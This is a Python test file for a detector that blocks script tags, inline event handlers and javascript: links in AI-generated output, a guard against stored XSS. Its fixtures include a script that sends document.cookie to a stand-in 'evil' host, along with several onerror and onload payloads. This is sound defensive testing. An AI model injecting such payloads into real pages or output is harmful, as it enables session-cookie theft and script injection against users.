"""script_tag_output_guard: allow path, block path, non-str safety, and engine
integration for HTML script tags / inline JS in generated output (stored XSS)."""
from typing import Any, cast

from interlock import PolicyEngine, SensorEvent, Verdict
from interlock.detectors.script_tag_output_guard import (
    PATTERN,
    POLICY_ID,
    script_tag_output_guard,
)

MALICIOUS_TEXT = "<script>fetch('//evil?c='+document.cookie)</script>"
BENIGN_TEXT = "<p>Here is your summary.</p>"


def _event(action="respond", args=None):
    return SensorEvent(action=action, args=args or {})


# --- allow path -------------------------------------------------------------


def test_benign_html_returns_none():
    detector = script_tag_output_guard()
    event = SensorEvent(action="respond", args={"text": BENIGN_TEXT})
    assert detector(event) is None


def test_empty_args_returns_none():
    detector = script_tag_output_guard()
    assert detector(_event(args={})) is None


def test_prose_about_script_tags_is_not_a_match():
    # Naming the technique in prose is not the technique: no tag or handler present.
    detector = script_tag_output_guard()
    event = _event(
        args={"text": "Always escape user output to prevent cross-site scripting."}
    )
    assert detector(event) is None


# --- block path -------------------------------------------------------------


def test_script_tag_in_output_blocks():
    detector = script_tag_output_guard()
    event = SensorEvent(action="respond", args={"text": MALICIOUS_TEXT})
    decision = detector(event)
    assert decision is not None
    assert decision.verdict is Verdict.BLOCK
    assert decision.policy_id == "script_tag_output"


def test_reason_names_the_offending_arg():
    detector = script_tag_output_guard()
    decision = detector(_event(args={"text": MALICIOUS_TEXT}))
    assert decision is not None
    assert decision.reason == "script_tag_output: text"


def test_offending_arg_name_is_reported_for_non_text_field():
    detector = script_tag_output_guard()
    decision = detector(
        _event(args={"title": "ok", "body": "<img src=x onerror=alert(1)>"})
    )
    assert decision is not None
    assert decision.reason == "script_tag_output: body"


def test_inline_handlers_and_js_scheme_block():
    detector = script_tag_output_guard()
    for payload in (
        "<img src=x onerror=alert(1)>",
        "<body onload=steal()>",
        "<a href=\"javascript:alert(1)\">click</a>",
        "</script>",
        "<SCRIPT>alert(1)</SCRIPT>",
    ):
        decision = detector(_event(args={"text": payload}))
        assert decision is not None, payload
        assert decision.verdict is Verdict.BLOCK
        assert decision.policy_id == POLICY_ID


def test_pattern_is_compiled_and_discriminates():
    assert PATTERN.search(MALICIOUS_TEXT) is not None
    assert PATTERN.search(BENIGN_TEXT) is None


# --- non-str safety ---------------------------------------------------------


def test_non_str_values_are_skipped_and_do_not_crash():
    # int / None / nested containers must neither crash nor be stringified into
    # a match; nested payloads are out of scope (top-level strings only).
    detector = script_tag_output_guard()
    event = _event(
        args={
            "count": 42,
            "flag": None,
            "nested": {"text": "<script>alert(1)</script>"},
            "items": ["<script>alert(1)</script>"],
        }
    )
    assert detector(event) is None


def test_non_str_value_before_a_match_is_skipped():
    detector = script_tag_output_guard()
    event = _event(args={"count": 3, "text": MALICIOUS_TEXT})
    decision = detector(event)
    assert decision is not None
    assert decision.verdict is Verdict.BLOCK
    assert decision.reason == "script_tag_output: text"


def test_non_dict_args_leaves_rule_silent_not_crashing():
    detector = script_tag_output_guard()
    # Deliberately malformed: args is not a mapping, so the rule must bail.
    event = SensorEvent(action="respond", args=cast(Any, "<script>x</script>"))
    assert detector(event) is None


# --- engine integration -----------------------------------------------------


def test_engine_blocks_malicious_and_allows_benign():
    engine = PolicyEngine(rules=[script_tag_output_guard()])

    blocked = engine.evaluate(
        SensorEvent(action="respond", args={"text": MALICIOUS_TEXT})
    )
    assert blocked.verdict is Verdict.BLOCK
    assert blocked.policy_id == POLICY_ID

    benign = engine.evaluate(
        SensorEvent(action="respond", args={"text": BENIGN_TEXT})
    )
    assert benign.verdict is Verdict.ALLOW
